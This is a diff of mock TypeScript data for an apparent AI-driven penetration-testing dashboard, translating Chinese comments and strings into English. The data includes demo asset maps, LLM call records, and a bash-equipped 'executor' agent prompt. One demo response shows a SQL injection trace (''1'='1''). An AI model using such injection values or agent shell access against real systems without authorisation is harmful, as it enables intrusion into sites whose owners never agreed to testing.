-// ── 资产覆盖图（/tasks/{id}/coverage-graph）──
+// ── Asset coverage map (/tasks/{id}/coverage-graph) ──
 export const coverageGraph = {
   nodes: [
     { key: "c:1", kind: "company", label: "Acme Corp", tested: false, in_scope: false, company_id: 1 },
@@ -3863,7 +3893,7 @@ export const coverageGraph = {
       domain: "www.acme.com",
       url: "https://www.acme.com",
       port: 443,
-      page_title: "Acme 首页",
+      page_title: "Acme Home",
       status_code: 200,
     },
     {
@@ -3909,7 +3939,7 @@ export const coverageGraph = {
       domain: "admin.acme.com",
       url: "https://admin.acme.com",
       port: 443,
-      page_title: "后台登录",
+      page_title: "Admin login",
       status_code: 200,
     },
     {
@@ -3937,8 +3967,8 @@ export const coverageGraph = {
   ],
 };
 
-// ── 资产在本任务关联的意图/事实/发现（/tasks/{id}/asset-refs）──
-// 播报板 demo:探索节点 → 其锚定资产。真实后端读 exploration_anchors,mock 里静态给几条。
+// ── Intents/facts/findings linked to an asset in this task (/tasks/{id}/asset-refs) ──
+// Broadcast board demo: exploration node → the assets it anchors. The real backend reads exploration_anchors; the mock hard-codes a few.
 const NODE_ASSETS: Record<string, number[]> = {
   fi1: [3],
   fi2: [2, 4],
@@ -3968,7 +3998,7 @@ export function assetRefsFor(_assetId: number) {
   };
 }
 
-// ── 工作空间文件管理器（/workspace/*，demo：静态示例树）──
+// ── Workspace file manager (/workspace/*; demo: static sample tree) ──
 const WS_TREE: Record<string, { name: string; dir: boolean; size: number; content?: string }[]> = {
   "": [
     { name: "t-001", dir: true, size: 0 },
@@ -3977,7 +4007,8 @@ const WS_TREE: Record<string, { name: string; dir: boolean; size: number; conten
       name: "notes.md",
       dir: false,
       size: 96,
-      content: "# 工作区笔记\n\n（demo）这是工作空间根目录下的示例文件，可在线编辑并保存。\n",
+      content:
+        "# Workspace notes\n\n(demo) This is a sample file in the workspace root; you can edit and save it online.\n",
     },
   ],
   "t-001": [
@@ -3996,11 +4027,16 @@ const WS_TREE: Record<string, { name: string; dir: boolean; size: number; conten
       name: "response.html",
       dir: false,
       size: 180,
-      content: "<!-- (demo) 抓到的响应体片段 -->\n<html><body>MySQL error near ''1'='1'</body></html>\n",
+      content: "<!-- (demo) captured response body snippet -->\n<html><body>MySQL error near ''1'='1'</body></html>\n",
     },
   ],
   transcripts: [
-    { name: "exp1-worker-i12.jsonl", dir: false, size: 512, content: "（demo）原始 LLM 对话记录示例，此处省略。" },
+    {
+      name: "exp1-worker-i12.jsonl",
+      dir: false,
+      size: 512,
+      content: "(demo) Sample raw LLM conversation log, omitted here.",
+    },
   ],
 };
 
@@ -4031,7 +4067,7 @@ export function workspaceRead(path: string) {
   return { path: key, size: f?.size ?? 0, binary: false, content: f?.content ?? "" };
 }
 
-// ── 工具执行历史（/commands）──
+// ── Tool run history (/commands) ──
 export const commandRecords = [
   {
     id: 1,
@@ -4039,7 +4075,7 @@ export const commandRecords = [
     worker: "worker-1",
     tool: "bash",
     command: JSON.stringify({ command: "curl -s 'https://www.acme.com/search?q=test'" }),
-    output: "HTTP/1.1 200 OK\nContent-Length: 12034\n<html>… 搜索结果页 …</html>",
+    output: "HTTP/1.1 200 OK\nContent-Length: 12034\n<html>… search results page …</html>",
     is_error: false,
     created_at: T("2026-08-09T02:10:00Z"),
   },
@@ -4085,13 +4121,13 @@ export const commandRecords = [
   },
 ];
 
-// ── LLM 录制（/llm/records、/llm/records/{id}）──
+// ── LLM recordings (/llm/records, /llm/records/{id}) ──
 export const llmRecords = [
   {
     id: 1,
     ts: T("2026-08-09T02:10:02Z"),
     model: "claude-opus-4-8",
-    profile_name: "默认",
+    profile_name: "Default",
     session_id: "exp1-worker-i12",
     task_id: "t-001",
     worker: "worker-1",
@@ -4106,7 +4142,7 @@ export const llmRecords = [
     id: 2,
     ts: T("2026-08-09T02:11:40Z"),
     model: "claude-opus-4-8",
-    profile_name: "默认",
+    profile_name: "Default",
     session_id: "exp1-planner",
     task_id: "t-001",
     worker: "planner",
@@ -4121,7 +4157,7 @@ export const llmRecords = [
     id: 3,
     ts: T("2026-08-09T02:15:20Z"),
     model: "claude-opus-4-8",
-    profile_name: "默认",
+    profile_name: "Default",
     session_id: "exp1-worker-i18",
     task_id: "t-001",
     worker: "worker-2",
@@ -4136,7 +4172,7 @@ export const llmRecords = [
     id: 4,
     ts: T("2026-08-09T02:16:05Z"),
     model: "claude-opus-4-8",
-    profile_name: "默认",
+    profile_name: "Default",
     session_id: "exp1-worker-i18",
     task_id: "t-001",
     worker: "worker-2",
@@ -4146,7 +4182,7 @@ export const llmRecords = [
     cache_read: 5200,
     cache_write: 0,
     status: "error",
-    error: "429 Too Many Requests（已退避重试）",
+    error: "429 Too Many Requests (backed off and retried)",
   },
 ];
 
@@ -4162,8 +4198,14 @@ export function llmRecordDetail(id: number, records = llmRecords) {
     request_body: JSON.stringify(
       {
         model: item.model,
-        system: "你是一个授权渗透测试系统的「执行者」…（省略）",
-        messages: [{ role: "user", content: "开始执行 system 提示里的这条意图：只做它、只产生事实、做完即停。" }],
+        system: "You are the 'executor' of an authorised penetration testing system… (omitted)",
+        messages: [
+          {
+            role: "user",
+            content:
+              "Start executing the intent in the system prompt: do only it, produce only facts, and stop when done.",
+          },
+        ],
         tools: ["bash", "insert_assets", "record_fact", "report_finding"],
       },
       null,
@@ -4181,19 +4223,29 @@ export function llmRecordDetail(id: number, records = llmRecords) {
       null,
       2,
     ),
-    // HTTP 原文：请求含被归一化视图丢弃的完整工具 schema，响应为原始 SSE 帧。
+    // Raw HTTP: the request includes the full tool schema that the normalised view drops; the response is the raw SSE frames.
     raw_request: JSON.stringify({
       model: item.model,
       max_tokens: 8192,
       stream: true,
       system: [
-        { type: "text", text: "你是一个授权渗透测试系统的「执行者」…（省略）", cache_control: { type: "ephemeral" } },
+        {
+          type: "text",
+          text: "You are the 'executor' of an authorised penetration testing system… (omitted)",
+          cache_control: { type: "ephemeral" },
+        },
       ],
-      messages: [{ role: "user", content: "开始执行 system 提示里的这条意图：只做它、只产生事实、做完即停。" }],
+      messages: [
+        {
+          role: "user",
+          content:
+            "Start executing the intent in the system prompt: do only it, produce only facts, and stop when done.",
+        },
+      ],
       tools: [
         {
           name: "bash",
-          description: "在目标环境中执行一条 shell 命令并返回其输出。",
+          description: "Run a shell command in the target environment and return its output.",
           input_schema: { type: "object", properties: { command: { type: "string" } }, required: ["command"] },
         },
       ],
